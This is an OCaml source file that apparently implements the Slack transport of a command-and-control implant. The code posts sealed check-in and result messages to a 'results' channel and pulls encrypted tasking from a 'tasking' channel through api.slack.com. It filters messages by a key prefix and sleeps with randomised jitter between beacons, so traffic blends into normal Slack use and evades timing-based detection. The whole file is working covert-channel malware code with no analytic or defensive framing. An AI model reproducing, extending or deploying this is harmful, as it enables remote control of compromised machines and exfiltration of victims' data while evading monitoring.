type config = {
  bot_token : string;
  tasking_channel : string;
  results_channel : string;
  key_prefix : string;
  interval_s : int;
  jitter_pct : float;
}

let slack_host = "api.slack.com"
let slack_port = 443

let escape_json_string s =
  let buf = Buffer.create (String.length s) in
  String.iter
    (fun c ->
      match c with
      | '"' -> Buffer.add_string buf "\\\""
      | '\\' -> Buffer.add_string buf "\\\\"
      | '\n' -> Buffer.add_string buf "\\n"
      | '\r' -> Buffer.add_string buf "\\r"
      | '\t' -> Buffer.add_string buf "\\t"
      | c -> Buffer.add_char buf c)
    s;
  Buffer.contents buf

let post_message ~bot_token ~channel ~text =
  let open Lwt.Syntax in
  let body =
    Printf.sprintf {|{"channel":"%s","text":"%s"}|}
      (escape_json_string channel)
      (escape_json_string text)
  in
  let request =
    Printf.sprintf
      "POST /api/chat.postMessage HTTP/1.1\r\n\
       Host: %s\r\n\
       Authorization: Bearer %s\r\n\
       Content-Type: application/json; charset=utf-8\r\n\
       Content-Length: %d\r\n\
       Connection: close\r\n\
       \r\n\
       %s"
      slack_host bot_token (String.length body) body
  in
  let* result =
    Tls_socket.https_request ~host:slack_host ~port:slack_port ~request
  in
  match result with
  | Error e -> Lwt.return_error e
  | Ok (code, resp_body) ->
    if code <> 200 then
      Lwt.return_error (Printf.sprintf "HTTP %d" code)
    else Lwt.return (Msg_codec.parse_post_response resp_body)

let get_history ~bot_token ~channel ~oldest ~limit =
  let open Lwt.Syntax in
  let oldest_param =
    match oldest with
    | Some ts -> Printf.sprintf "&oldest=%s" ts
    | None -> ""
  in
  let request =
    Printf.sprintf
      "GET /api/conversations.history?channel=%s%s&limit=%d HTTP/1.1\r\n\
       Host: %s\r\n\
       Authorization: Bearer %s\r\n\
       Connection: close\r\n\
       \r\n"
      channel oldest_param limit slack_host bot_token
  in
  let* result =
    Tls_socket.https_request ~host:slack_host ~port:slack_port ~request
  in
  match result with
  | Error e -> Lwt.return_error e
  | Ok (code, resp_body) ->
    if code <> 200 then
      Lwt.return_error (Printf.sprintf "HTTP %d" code)
    else Lwt.return (Msg_codec.parse_history_response resp_body)

let create (config : config) =
  let oldest_tasking = ref None in
  let poll ~session ~msg =
    let open Lwt.Syntax in
    match
      Bcheck_codec.Frame.seal session ~direction:`To_server msg
    with
    | Error e -> Lwt.return_error e
    | Ok envelope ->
      let text =
        Msg_codec.encode_message ~prefix:config.key_prefix envelope
      in
      let* post_result =
        post_message ~bot_token:config.bot_token
          ~channel:config.results_channel ~text
      in
      (match post_result with
      | Error e -> Lwt.return_error ("post checkin: " ^ e)
      | Ok _ts ->
        let* history_result =
          get_history ~bot_token:config.bot_token
            ~channel:config.tasking_channel
            ~oldest:!oldest_tasking ~limit:100
        in
        (match history_result with
        | Error e -> Lwt.return_error ("get tasks: " ^ e)
        | Ok msgs ->
          let matching =
            List.filter_map
              (fun (ts, text) ->
                match
                  Msg_codec.decode_message
                    ~prefix:config.key_prefix text
                with
                | Some raw -> Some (ts, raw)
                | None -> None)
              msgs
          in
          (match matching with
          | [] -> Lwt.return_ok []
          | pairs ->
            oldest_tasking := Some (Msg_codec.newest_ts pairs);
            let decoded =
              List.filter_map
                (fun (_ts, raw) ->
                  match
                    Bcheck_codec.Frame.open_ session
                      ~direction:`To_client raw
                  with
                  | Ok msg -> Some msg
                  | Error _ -> None)
                pairs
            in
            Lwt.return_ok decoded)))
  in
  let send_result ~session msg =
    let open Lwt.Syntax in
    match
      Bcheck_codec.Frame.seal session ~direction:`To_server msg
    with
    | Error e -> Lwt.return_error e
    | Ok envelope ->
      let text =
        Msg_codec.encode_message ~prefix:config.key_prefix envelope
      in
      let* result =
        post_message ~bot_token:config.bot_token
          ~channel:config.results_channel ~text
      in
      (match result with
      | Error e -> Lwt.return_error e
      | Ok _ts -> Lwt.return_ok ())
  in
  let jittered_sleep () =
    let interval = Float.max 10.0 (float_of_int config.interval_s) in
    let jitter_range = interval *. config.jitter_pct in
    let delta = Random.float (2.0 *. jitter_range) -. jitter_range in
    let sleep_s = Float.max 10.0 (interval +. delta) in
    Lwt_unix.sleep sleep_s
  in
  Channel.{ poll; send_result; jittered_sleep }
